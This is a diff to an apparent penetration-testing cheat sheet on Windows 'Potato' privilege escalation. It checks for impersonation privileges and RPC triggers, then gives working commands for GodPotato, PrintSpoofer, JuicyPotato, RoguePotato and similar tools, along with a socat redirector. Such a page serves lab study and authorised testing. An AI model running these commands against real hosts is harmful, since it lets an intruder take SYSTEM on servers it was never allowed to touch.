@@ -2,11 +2,11 @@
 
 [← Windows quick reference](../04-windows-privesc.md)
 
-"Potato" names several different techniques. Start with the current token and the service or RPC endpoint available on the host. An OS version alone does not pick a working binary.
+Select by token privilege and working RPC/service trigger, not OS version alone.
 
 ## Check the host
 
-Use this after landing in a service context such as IIS or MSSQL. `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` must be available for the token-impersonation paths below.
+Service shell (IIS/MSSQL): check `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
 
 ```powershell
 whoami /all
@@ -15,7 +15,7 @@ Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumbe
 [System.Environment]::Version
 ```
 
-Check a trigger before choosing its tool:
+Check triggers:
 
 ```powershell
 sc.exe query Spooler
@@ -33,39 +33,39 @@ sc.exe query PcaSvc
 | Older Windows with a matching elevated CLSID | JuicyPotato |
 | External TCP/135 redirector and a matching COM route | RoguePotato |
 
-Test one candidate at a time. A tool's name, supported OS range, or success message does not prove that it obtained SYSTEM. A file is a better first test than a new console, which may be invisible from a service shell.
+Test with `whoami > file`; a spawned console may be invisible.
 
 ## Selected commands
 
-Broad DCOM/RPCSS choices:
+DCOM/RPCSS:
 
 ```powershell
 .\SigmaPotato.exe 'cmd /c whoami > C:\Windows\Temp\sigma.txt'
 .\GodPotato-NET4.exe -cmd 'cmd /c whoami > C:\Windows\Temp\god.txt'
 ```
 
-Use either command only with a binary whose syntax you have checked. Read the output file after execution and confirm the identity.
+Check local binary syntax; read the output file.
 
-With Print Spooler running:
+Spooler running:
 
 ```powershell
 .\PrintSpoofer64.exe -c 'cmd /c whoami > C:\Windows\Temp\print.txt'
 ```
 
-If EFSRPC is the viable trigger, select one implementation:
+EFSRPC trigger:
 
 ```powershell
 .\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\sharp-efs.txt'
 .\PetitPotato.exe 3 'cmd.exe /c whoami > C:\Windows\Temp\petit.txt'
 ```
 
-Classic JuicyPotato belongs on a matching older host and needs an OS-appropriate CLSID:
+Older host + matching elevated CLSID:
 
 ```powershell
 .\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\juicy.txt' -t '*' -c '{<OS-MATCHING-CLSID>}'
 ```
 
-RoguePotato also needs a Kali-side TCP/135 redirector. Confirm that the target can reach it.
+RoguePotato: target must reach Kali TCP/135 redirector.
 
 ```bash
 sudo socat TCP-LISTEN:135,reuseaddr,fork TCP:<TARGET-IP>:9999
